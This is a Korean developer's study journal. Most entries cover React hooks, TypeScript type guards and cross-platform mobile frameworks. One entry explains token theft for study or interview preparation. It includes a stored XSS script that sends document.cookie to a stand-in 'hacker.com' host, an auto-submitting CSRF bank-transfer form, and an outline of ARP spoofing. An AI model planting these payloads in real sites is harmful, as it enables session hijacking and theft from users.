# Today I Learned

## 목차

- [Week 1 (2025-03-03 ~ 2025-03-07)](#week-1-2025-03-03---2025-03-07)
- [Week 2 (2025-03-10 ~ 2025-03-14)](#week-2-2025-03-10---2025-03-14)

---

## Week 1 (2025-03-03 ~ 2025-03-07)

<details>
<summary>2025-03-04 TUE</summary>

### useState

props를 부모에게 받았을 경우 자식 컴포넌트는 무조건 리렌더링됨. (state가 변경되지 않아도 리렌더링이 될수도 있음)

**리액트 리렌더링 조건**
>1. state 변경 시 리렌더링
>2. props 변경 시 리렌더링
>3. 부모 컴포넌트 리렌더링 발생 시 자식 컴포넌트 리렌더링

부모 컴포넌트 리렌더링 발생 시 모든 자식 컴포넌트도 리렌더링되는 것은 부하가 될 수 있다.

~~그러므로 props로 연결된 부분을 없애고 하위 컴포넌트에서 정의를 하는게 나을 수 있다.~~

⇒ 이런 경우 useMemo훅, useCallback, React.memo을 사용해 캐싱할 수 있다.

**setState의 활용**

state의 set 상태변화함수는 상태를 함수를 활용해 변경하는 역할을 한다. onChange나 onClick같은 이벤트리스너와 조합하면 사용자 입력에 따라 상태를 변경하는 기능을 만들 수 있다.

++ state 변수에는 객체도 등록이 가능함. 이를 통해 여러개의 state 변수를 관리하는 것보다 안전하게 관리가 가능함.

상태 변경 시에 다른 부분은 그대로 유지하고 한 부분만 변경하도록하여 적용한다.

- 스프레드 연산자 : …객체명을 통해 객체의 요소들을 한번에 표현할 수 있다.
- 자바스크립트의 문법으로 객체 속성에 동적으로 접근할 때 [벼]

### useMemo

useMemo 훅은 정의한 함수의 의존성 배열 값이 변경되지 않는 경우 이전 실행 결과를 재사용한다. 그래서 특정 컴포넌트의 리렌더링을 막을 수 있다. 

**단, useMemo는 메모리 사용량 증가로 이어지며 성능이 떨어질수도 있다.** 

**또한 메모이제이션 값이 너무 많아지면 관리가 어렵다.** 

### useCallback

useCallback 훅은 함수를 메모이제이션한다. 특정 함수의 실행 결과를 재사용한다.

### 의존성 배열

- 불필요한 재실행을 막고 싶다면 꼭 필요한 값만 의존성 배열에 넣어야 한다.
- 빈 배열을 넣으면 최초 1회만 실행됨. 그 이후로는 변경되는 값이 없기 때문에 다시 실행되지 않음.
- 의존성 배열을 생략하면 useMemo, useEffect 등의 훅이 매번 실행됨 → 최적화 효과가 없음

### useEffect와 useMemo

| Hook | 사용 목적 | 실행 시점 | 반환 값 | 주의할 점 |
| --- | --- | --- | --- | --- |
| `useEffect` | 부수 효과 (Side Effects) 처리 | 렌더링 후 (After Render) 실행 | `undefined` (리턴값 없음) | 비동기 작업, DOM 조작 등에 사용 |
| `useMemo` | 값(Value) 메모이제이션 | 렌더링 중 (During Render) 실행 | 캐싱된 값(Value) | 연산이 무거운 경우에만 사용해야 성능 최적화됨 |

useMemo는 렌더링 도중 실행되며 비동기 작업 불가능

```
💡 useMemo 프로세스

의존성 배열에 있는 값이 변경 → 컴포넌트가 다시 렌더링 → 그 렌더링 과정 중에 useMemo가 실행
```

### useRef

이전 값과 새로운 값을 연결하고, 렌더링과는 무관하게 값이 유지되어야 할 때 사용됨.

```tsx
const a = useRef(초기값); // ref 객체 선언
a.current // ref 객체의 상태 조회
```

리렌더링을 해도 ref객체의 상태는 유지되고 ref객체의 상태가 변해도 렌더링이 발생하지 않는다는 특징을 갖고 있다.

## 번외

### 타입스크립트의 type guard

이전까지 타입스크립트를 사용하면서 `any` 만 안쓰면 되겠지 하며 assertion type 일명 `as` 키워드를 자주 사용해왔다. 그 이유는 null이 올 수 있더라도 변수의 타입이 string 타입이라는 개인적인? 확신이 있었기 때문이다. 

JS에서는 타입 좁히기(type narrowing)가 타입을 더 쉽게 예측할 수 있는 작업이었고, `as` 키워드 또한 type narrowing 중 하나의 수단이라고 생각했다. 

그런데 공부하다보니 이 `as` 의 타입 확정은 오히려 타입스크립트의 타입 검사 기능을 포기하겠다는 것이나 다름없다고 한다. 그 이유는 개발자가 변수에 어떤 타입이 올지 확실히 인지했다 하여도 `as` 선언에서 실수를 한다면 런타임에러가 터지기 전까지 인지할 수 없기 때문이다.

그 이유는 다음과 같다.

1. 자신은 반드시 string 타입이 올 것이라 생각해 as string을 작성함.
2. 하지만 그것은 개발자의 착각일 가능성이 있거나 요구사항 변경에 따라 변하게 될 가능성이 있음
3. 그렇게 컴파일 시점을 자연스럽게 통과하더라도 런타임에서 오류가 터질 수 있음

비유하자면 이러한 방식은 컴파일러에게 “내가 이 타입을 너보다 더 잘알고있음. 믿어주셈 ㅇㅇ” 라고 말하는 것과 같다. 어림도 없다.

### **결론**

as보다 type narrowing의 올바른 기법은 null 체크 혹은 typeof나 instanceof를 사용한 type guard 기법이다. 이러한 type guard 기법은 무조건 타입을 확정짓는 as와 달리 `타입 검사를 통과하면 타입이 확정` 되기 때문에 옳은 방식이다.

### 자바의 instanceof

> </br>  
> typeof나 instanceof를 사용한 type narrowing은 자바에서는 지양해야 한다. 왜냐하면 instanceof 체크가 필요한 부분이 있다면 그 부분은 객체지향적으로 분리가 필요한 부분일 가능성이 높기 때문이다.
> 
> 1. OCP 위반 : 새로운 타입이 추가될 때마다 instanceof 체크를 변경해야 함.
> 2. TDA(tell don’t ask) 위반: 데이터를 요구하지 않고 객체가 자연스럽게 상호작용하도록해야함. 데이터를 요구하는 행위는 두 함수의 데이터 결합이 이뤄졌다는 뜻임
> 3. 다형성 위반 : instanceof 체크는 강제로 그 타입인 상태일 때의 행동을 규정하므로 미리 설정해둔 동작을 벗어난 동작을 함.
> </br>
</details>

<details>
<summary>2025-03-05 WED</summary>

# 토큰 탈취가 일어나는 과정과 대응방안을 설명해주세요
토큰 탈취가 일어나는 과정, 즉 공격자가 토큰을 탈취하는 방법에는 여러가지가 있습니다. 

## XSS(Cross Site Scripting) 공격

XSS는 보안이 취약한 웹사이트에 악의적인 스크립트를 삽입하여 사용자 브라우저에서 실행되도록 하는 공격입니다.

1. 취약점이 있는 웹사이트의 특징?
    
    다음과 같은 웹사이트는 취약점이 있을 수 있습니다.
    
    - 입력값 검증 X : 서버에서 위험한 입력을 검증한다면 사전 방지할 수 있음
    - innerHTML을 사용해 DOM을 직접 조작하는 웹사이트 : innerHTML은 문자열을 HTML로 바꾸기 때문에 이러한 스크립트에 더욱 취약함
    - eval 함수를 사용하는 웹사이트(eval은 입력을 코드로 실행할 수 있는 JS 함수임)
    - HttpOnly 쿠키 미사용 : HttpOnly가 적용된 쿠키는 접근 불가능하므로 보호될 수 있음
    
    해커는 이러한 취약점이 있는 웹사이트에 스크립트를 삽입합니다. 해커와 유저는 서로 다른 클라이언트이기 때문에 서로에게 영향을 주지는 않지만 **해커가 조작한 데이터가 DB에 삽입되는 경우**는 다릅니다.
    

1. 공격자 스크립트의 동작 과정
    
    EX) 해커가 댓글을 작성한 후 그 스크립트가 유저의 PC에서 동작하는 과정
    
    1. 댓글 스크립트
    
    ```tsx
    좋은 글이네요! <script>var img = new Image(); img.src = "https://hacker.com/steal?cookie=" + document.cookie;</script>
    ```
    
    1. 유저 측에서 확인되는 스크립트
    
    ```tsx
    <div class="comment">
      좋은 글이네요! <script>var img = new Image(); img.src = "https://hacker.com/steal?cookie=" + document.cookie;</script>
    </div>
    ```
    
    이런 식으로 서버를 경유해서 스크립트가 저장됩니다.
    
    클라이언트가 이 사이트에 접근했을 때 해커의 사이트로 쿠키와 함께 이미지 요청을 발송하게 됩니다.
    

 

## CSRF 공격

1. **사용자 인증**
    
    사용자가 웹사이트에 로그인하여 인증 쿠키를 받습니다.
    
2. **인증 상태 유지**
    
    브라우저는 해당 웹사이트에 대한 쿠키를 저장하고 유지합니다.
    
3. **악성 사이트 방문**
    
    사용자가 로그인 상태를 유지한 채로 공격자의 웹사이트나 악성 이메일 링크를 클릭합니다.
    
4. **위조된 요청 실행**
    
    공격자의 사이트는 자동으로 대상 웹사이트에 요청을 보내는 코드를 실행합니다. 예를 들면:
    
    - 자동 제출되는 폼
    - 이미지 태그를 이용한 GET 요청
    - JavaScript를 이용한 요청
5. **브라우저의 쿠키 전송**
    
    브라우저는 요청과 함께 대상 웹사이트에 대한 인증 쿠키를 자동으로 전송합니다.
    
6. **서버의 요청 처리**
    
    대상 웹사이트 서버는 유효한 인증 쿠키를 받았으므로 요청이 합법적인 사용자로부터 온 것으로 간주하고 처리합니다.
    

EX) 악성 웹사이트의 HTML에서 사용자의 쿠키를 활용해 요청을 보내는 경우

```tsx
<!-- 악성 웹사이트의 HTML -->
<body onload="document.getElementById('transfer-form').submit()">
  <form id="transfer-form" action="https://bank.example.com/api/transfer" method="POST">
    <input type="hidden" name="recipient" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
</body>
```

위와 같은 경우 해커가 미리 지정한 value 값으로 계좌이체를 진행하게 됩니다.

### CSRF 방어 방법

1. csrf 토큰을 사용 : 서버에서 생성한 랜덤 토큰을 요청마다 포함시켜 same-site임을 검증
2. same-site 쿠키 속성 : 같은 same site 요청인 경우에만 쿠키 전송
3. Origin 헤더 검증 : CORS를 통해 허용된 Origin 헤더인 경우에 요청을 허용.

## MITM(Man-in-the-Middle) 공격

흔히 말하는 중간에서 공격자가 데이터 전송을 가로채는 기법입니다.

HTTPS로 암호화된 데이터 전송이 아닌 경우 중간에 헤더에 담긴 토큰을 탈취한 후 해석하는 것이 가능합니다.

1. 공격자는 통신 경로(네트워크)에 침입합니다.
    - ARP 스푸핑: 로컬 네트워크의 캐시를 조작해 피해자의 트래픽을 자신에게 리디렉션 하도록 설정함(MAC주소와 IP주소간의 매핑을 조작)
    - DNS 스푸핑: DNS 서버를 조작해 해커의 IP로 요청을 보내도록함
2. 트래픽 가로채기
    
    **ARP 스푸핑**
    
    - 공격자는 로컬 네트워크에서 지속적으로 위조된 ARP 메시지를 브로드캐스트합니다.
    - 이 메시지는 "라우터의 IP 주소는 공격자의 MAC 주소와 연결되어 있다"고 알립니다.
    - 또한 "대상 컴퓨터의 IP 주소는 공격자의 MAC 주소와 연결되어 있다"고 라우터에 알립니다.
    - 피해자의 컴퓨터와 라우터는 ARP 캐시를 업데이트합니다.
    - 결과적으로 피해자와 라우터 사이의 모든 트래픽이 공격자의 컴퓨터를 통과하게 됩니다
</details>

<details>
<summary>2025-03-06 THU</summary>

## 플러터 VS 리액트네이티브
### 크로스 플랫폼 앱이란?
크로스 플랫폼 앱은 하나의 소스 코드로 Android, IOS에서 똑같이 작동하는 앱을 의미합니다.
네이티브 앱과 대조되는 개념입니다.
기존의 네이티브 앱은 Android, IOS가 각각 호환이 안되기 때문에 두개의 앱을 만드는 것과 다름이 없었습니다. 근데 크로스 플랫폼 앱 하나가 있다면 두 운영체제를 동시에 개발하고 운영할 수 있다는 장점이 있습니다.

### 리액트 네이티브란?
JS와 React를 기반으로 만들어졌기 때문에 기본 지식을 알고 있는 사람이라면 RN을 시작할 수 있습니다.
리액트 네이티브는 런타임 중에 JS 브릿지를 생성하고 JS 코드를 네이티브 코드로 변환해서 컴파일함. 그래서 JS의 Object-C API로 IOS 컴포넌트를 만들고 자바 API로 안드로이드 컴포넌트로 렌더링할 수 있음.

### 리액트 네이티브의 차별점?
- 리액트 네이티브는 CodePush라는 시스템을 사용해 기존 출시한 앱을 원격으로 업데이트할 수 있습니다.
- 단, 프로젝트의 리액트 네이티브 버전 업데이트가 어렵습니다.
- 범용적인 개발 언어!(JS/TS)
- 운영체제 별 순정 UI를 사용함.

### 웹 개발자의 접근성이 정말 낮은가?
- 여러 문법들과 Hook, 라이프 사이클은 React와 동일하지만 RN은 모바일이기 때문에 안드로이드, IOS에 대한 기초적인 지식이 필요합니다.

### 플러터란?
Flutter는  ios, Android, 데스크탑, 웹앱을 구현하는 크로스 플랫폼 프레임워크입니다. 다소 생소한 Dart 언어를 사용하는데 플러터는 RN과 달리 별도의 브릿지가 필요없기 때문에 성능이 우수합니다.

### 브릿지가 없지만 Flutter는 어떻게 여러 플랫폼을 지원할까?
- Dart 언어는 앱이 빌드되기 전에 코드를 미리 컴파일하는 Ahead-of-time(AOT) 전략을 지원합니다. 컴파일 타임에 Dart 코드를 네이티브 코드로 컴파일하기 때문에 브릿지가 필요없이 각 플랫폼과 직접 통신할 수 있습니다. 그래서 앱 시작 속도도 빠릅니다.
- 또한 자체적인 위젯을 canvas 위에 직접 렌더링하기 때문에 여러 플랫폼에 동일한 UI를 제공할 수 있습니다. (자체 UI)
- 개발환경도 다양할 뿐더러 다양한 빌드 모드를 지원함

### 플러터의 차별점?
- 플러터의 커뮤니티가 큼
- 자체 디자인 언어를 가진 커스텀 UI를 사용한 앱을 만듬
- 프로젝트의 플러터 버전 업데이트가 쉬움 (아마 Dart는 JS/TS와 달리 자체 의존성을 많이 사용하기 때문인듯. RN은은 open source 의존성을 사용해서 어려운 듯)

</details>

---

## Week 2 (2025-03-10 ~ 2025-03-14)
